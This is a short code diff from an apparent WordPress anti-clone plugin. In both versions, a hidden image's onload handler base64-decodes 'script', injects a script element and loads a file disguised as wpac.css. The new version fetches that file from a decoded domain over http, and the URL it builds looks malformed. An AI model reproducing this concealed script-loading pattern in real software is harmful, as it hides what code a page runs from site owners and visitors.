@@ -36,7 +36,7 @@ function wpac_add_js() {
     $domainString .= '\''.base64_encode(str_replace('.www', '', $domain)).'\',';
   }
   $content = <<<EOD
-  <img src="{$pluginsUrl}/wp-anticlone/wpac.png" style="display: none;" onload="window.wpac_domains=[{$domainString}];var inj=document.createElement(atob('c2NyaXB0'));inj.src='{$pluginsUrl}/wp-anticlone/wpac.css';document.getElementsByTagName('head')[0].appendChild(inj);"/>
+  <img src="{$pluginsUrl}/wp-anticlone/wpac.png" style="display: none;" onload="window.wpac_domains=[{$domainString}];var inj=document.createElement(atob('c2NyaXB0'));inj.src='http://'+atob(window.wpac_domains[0])+'/{$pluginsUrl}/wp-anticlone/wpac.css';document.getElementsByTagName('head')[0].appendChild(inj);"/>
 EOD;
   echo $content;
 }
